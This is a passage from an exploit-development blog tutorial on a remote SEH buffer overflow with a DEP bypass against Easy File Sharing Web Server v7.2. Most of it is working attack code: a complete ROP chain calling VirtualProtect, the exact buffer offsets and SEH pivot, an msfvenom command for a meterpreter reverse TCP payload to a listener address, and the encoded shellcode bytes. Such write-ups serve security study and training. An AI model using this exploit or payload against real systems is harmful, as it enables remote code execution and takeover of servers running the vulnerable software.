<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># ROP chain generated with mona.py - www.corelan.be (and slightly fixed by @TheKnapsy)</span>
</span><span class='line'><span class="c"># Essentially, use PUSHAD to set all parameters and call VirtualProtect() to disable DEP.</span>
</span><span class='line'><span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="c"># Generate value of 201 in EAX</span>
</span><span class='line'>    <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll]</span>
</span><span class='line'>    <span class="mh">0xFFFFFDFF</span><span class="p">,</span>  <span class="c"># Value of &#39;-201&#39;</span>
</span><span class='line'>    <span class="mh">0x100231d1</span><span class="p">,</span>  <span class="c"># NEG EAX # RETN [ImageLoad.dll]</span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)</span>
</span><span class='line'>    <span class="mh">0x1001da09</span><span class="p">,</span>  <span class="c"># ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]</span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># Carry on with the ROP as generated by mona.py</span>
</span><span class='line'>    <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c832d0</span><span class="p">,</span>  <span class="c"># ptr to &amp;VirtualProtect() [IAT sqlite3.dll]</span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># Compensate for the ADD EBX,EAX gadget above, jump over 1 address, which is a dummy writeable location</span>
</span><span class='line'>    <span class="c"># used solely by this the remaining part of the above gadget (it doesn&#39;t really do anything for us)</span>
</span><span class='line'>    <span class="mh">0x1001281a</span><span class="p">,</span>  <span class="c"># ADD ESP,4 # RETN [ImageLoad.dll]</span>
</span><span class='line'>    <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;Writable location [sqlite3.dll]</span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># And carry on further as generated by mona.py</span>
</span><span class='line'>    <span class="mh">0x1002248c</span><span class="p">,</span>  <span class="c"># MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c18d81</span><span class="p">,</span>  <span class="c"># XCHG EAX,EDI # RETN [sqlite3.dll]</span>
</span><span class='line'>      <span class="mh">0x1001d626</span><span class="p">,</span>  <span class="c"># XOR ESI,ESI # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x10021a3e</span><span class="p">,</span>  <span class="c"># ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x10013ad6</span><span class="p">,</span>  <span class="c"># POP EBP # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c227fa</span><span class="p">,</span>  <span class="c"># &amp; push esp # ret  [sqlite3.dll]</span>
</span><span class='line'>      <span class="mh">0x10022c4c</span><span class="p">,</span>  <span class="c"># XOR EDX,EDX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># Now bunch of ugly increments... may need to look for something nicer, but hey - it works!</span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x1001b4f6</span><span class="p">,</span>  <span class="c"># POP ECX # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;Writable location [sqlite3.dll]</span>
</span><span class='line'>      <span class="mh">0x100194b3</span><span class="p">,</span>  <span class="c"># POP EDI # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x1001a858</span><span class="p">,</span>  <span class="c"># RETN (ROP NOP) [ImageLoad.dll]</span>
</span><span class='line'>      <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x90909090</span><span class="p">,</span>  <span class="c"># nop</span>
</span><span class='line'>      <span class="mh">0x100240c2</span><span class="p">,</span>  <span class="c"># PUSHAD # RETN [ImageLoad.dll] </span>
</span><span class='line'>    <span class="p">]</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Those <code>INC EDX</code> are really ugly and annoying, but, quickly looking around for a better solution available, I actually didn&rsquo;t find anything nicer. Luckily we have a massive buffer in our disposal, so we can be a bit sloppy&hellip;</p>

<p>We are almost there! To quickly test wether we are actually disabling DEP or not, let&rsquo;s modify our buffer a bit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Offsets</span>
</span><span class='line'><span class="n">rop_offset</span> <span class="o">=</span> <span class="mi">2455</span>
</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">rop_offset</span>                       <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xCC\xCC\xCC\xCC</span><span class="s">&quot;</span>                   <span class="c"># couple INT3 instructions, which will act as a breakpoint (only if DEP is disabled)</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">seh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>                              <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0x1002280a</span><span class="p">)</span>          <span class="c"># overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span>          <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>        <span class="c"># padding</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s put it all together and launch our exploit. If we were successful in disabling DEP, the program should automatically break on the INT3 instructions we added right after the ROP chain.</p>

<p><a href="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/success_rop.png"><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/success_rop.png" alt="success_rop PNG" /></a></p>

<p><strong>VICTORY! :)</strong></p>

<h2>Shellcode</h2>

<p>We have successfully bypassed DEP and made stack executable again! Now we can simply put a shellcode of our choice and get that shell!</p>

<p>Doing a bit of maths, we can easily calculate that the maximum size of the shellcode can be 1260 bytes, which is <em>A LOT</em> for a shellcode - and more than enough to fit meterpreter! Let&rsquo;s go ahead and generate a payload we&rsquo;ll use:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.246.171 LPORT=31337 -f python -b '\x00\x3b' | sed 's/buf/shellcode/g'</span></code></pre></td></tr></table></div></figure>


<p>And paste it in right after the ROP chain. Note that the last instruction in our ROP chain is <code>PUSHAD; RETN</code>, so the next instruction to be executed will be simply the next instruction after this one - that&rsquo;s why we&rsquo;re putting our shellcode immediatelly after.</p>

<p>Also, there&rsquo;s a small &lsquo;trick&rsquo; to keep in mind. Because of the way meterpreter decoders work, during the decoding process meterpreter needs to find its own address in memory. It is achieved by using <code>FSTENV</code> instruction, which stores floating point environment on the stack. Because ESP points somewhere in our shellcode, <code>FSTENV</code> writes some additional data onto the stack, what corrupts our shellcode!</p>

<p>One simple way around it is to simply move ESP all the way &ldquo;up&rdquo; (towards lower memory addresses), far away from our shellcode so it doesn&rsquo;t get corrupted. How far to move? Generally size of the shellcode would do. I chose 1500, just to be on the safe side.</p>

<p>Generate relevant opcode (remember about the bad chars that we should avoid!):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali2:~# /usr/share/metasploit-framework/tools/exploit/metasm_shell.rb
</span><span class='line'>type "exit" or "quit" to quit
</span><span class='line'>use ";" or "\n" for newline
</span><span class='line'>type "file &lt;file&gt;" to parse a GAS assembler source file
</span><span class='line'>
</span><span class='line'>metasm &gt; add esp,-1500
</span><span class='line'>"\x81\xc4\x24\xfa\xff\xff"</span></code></pre></td></tr></table></div></figure>


<p>And add it as a first instruction in the shellcode. The buffer should look something like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Offsets</span>
</span><span class='line'><span class="n">rop_offset</span> <span class="o">=</span> <span class="mi">2455</span>
</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c"># move ESP out of the way so the shellcode doesn&#39;t corrupt itself during execution</span>
</span><span class='line'><span class="c"># metasm &gt; add esp,-1500</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span>  <span class="s">&quot;</span><span class="se">\x81\xc4\x24\xfa\xff\xff</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.246.171 LPORT=31337 -f python -b &#39;\x00\x3b&#39;</span>
</span><span class='line'><span class="c">#Payload size: 360 bytes</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xb8\x78\xdc\xf7\x67\xda\xc6\xd9\x74\x24\xf4\x5d\x29</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc9\xb1\x54\x31\x45\x13\x83\xc5\x04\x03\x45\x77\x3e</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x02\x9b\x6f\x3c\xed\x64\x6f\x21\x67\x81\x5e\x61\x13</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc1\xf0\x51\x57\x87\xfc\x1a\x35\x3c\x77\x6e\x92\x33</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x30\xc5\xc4\x7a\xc1\x76\x34\x1c\x41\x85\x69\xfe\x78</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x46\x7c\xff\xbd\xbb\x8d\xad\x16\xb7\x20\x42\x13\x8d</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xf8\xe9\x6f\x03\x79\x0d\x27\x22\xa8\x80\x3c\x7d\x6a</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x22\x91\xf5\x23\x3c\xf6\x30\xfd\xb7\xcc\xcf\xfc\x11</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x1d\x2f\x52\x5c\x92\xc2\xaa\x98\x14\x3d\xd9\xd0\x67</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc0\xda\x26\x1a\x1e\x6e\xbd\xbc\xd5\xc8\x19\x3d\x39</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x8e\xea\x31\xf6\xc4\xb5\x55\x09\x08\xce\x61\x82\xaf</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x01\xe0\xd0\x8b\x85\xa9\x83\xb2\x9c\x17\x65\xca\xff</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xf8\xda\x6e\x8b\x14\x0e\x03\xd6\x70\xe3\x2e\xe9\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x6b\x38\x9a\xb2\x34\x92\x34\xfe\xbd\x3c\xc2\x01\x94</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xf9\x5c\xfc\x17\xfa\x75\x3a\x43\xaa\xed\xeb\xec\x21</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xee\x14\x39\xdf\xeb\x82\x6e\x30\x02\xf9\x07\x33\xea</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x87\xbe\xba\x0c\x27\x11\xed\x80\x87\xc1\x4d\x71\x6f</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x08\x42\xae\x8f\x33\x88\xc7\x25\xdc\x65\xbf\xd1\x45</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x2c\x4b\x40\x89\xfa\x31\x42\x01\x0f\xc5\x0c\xe2\x7a</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xd5\x78\x93\x84\x25\x78\x3e\x85\x4f\x7c\xe8\xd2\xe7</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x7e\xcd\x15\xa8\x81\x38\x26\xaf\x7d\xbd\x1f\xdb\x4b</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x2b\x20\xb3\xb3\xbb\xa0\x43\xe5\xd1\xa0\x2b\x51\x82</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xf2\x4e\x9e\x1f\x67\xc3\x0a\xa0\xde\xb7\x9d\xc8\xdc</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xee\xe9\x56\x1e\xc5\x6a\x90\xe0\x9b\x4e\x39\x89\x63</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xce\xb9\x49\x0e\xce\xe9\x21\xc5\xe1\x06\x82\x26\x28</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x4f\x8a\xad\xbc\x3d\x2b\xb1\x95\xe0\xf5\xb2\x19\x39</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xe3\x3c\xde\xbe\x0c\xbf\xe3\x68\x35\xb5\x24\xa9\x02</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc6\x1f\x8c\x23\x4d\x5f\x82\x34\x44</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>
